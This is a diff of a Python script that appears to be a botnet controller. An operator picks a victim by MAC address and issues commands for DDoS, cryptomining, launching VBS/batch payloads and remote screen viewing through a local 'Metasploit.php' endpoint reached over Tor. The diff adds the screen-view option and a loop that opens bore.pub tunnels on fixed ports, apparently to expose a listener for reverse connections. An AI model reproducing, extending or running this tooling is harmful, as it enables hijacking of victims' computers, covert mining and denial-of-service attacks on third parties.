@@ -1,5 +1,6 @@
 import requests
 import time
+import sys
 import os
 
 
@@ -19,13 +20,24 @@ if os.path.exists(file_to_delete):
 
 while True:
     mac = input("Enter Mac: ")
-    option = input("(START/STOP/STARTVBSBAT/MINING/DDOS/SCR) : ")
-
+    option = input("(START/STOP/STARTVBSBAT/MINING/DDOS/SCRV) : ")
+    
     if option == "DDOS":
         target = input("Target >>> : ")
+    elif option not in ["START", "STOP", "STARTVBSBAT", "MINING", "DDOS", "SCRV"]:
+       python_executable = sys.executable
+       os.execl(python_executable, python_executable, *sys.argv)
+    elif option == "SCRV":
+       os.system("gnome-terminal -- python3 SCRV.py")
+    elif option == "START":
+       PORT = input("LocalHost Port : ")
+       BPORT = [61723, 3348, 44693, 44688, 12554, 12539, 61956, 12248, 10010, 10012]
+       for port in BPORT:
+           os.system(f"gnome-terminal -- ./bore local {PORT} --to bore.pub -p {port}")
+
     else:
         target = ""
-
+    
     # Define the Tor onion service URL
     tor_url = 'http://127.0.0.1:8080/Metasploit.php'
     if option == "DDOS":
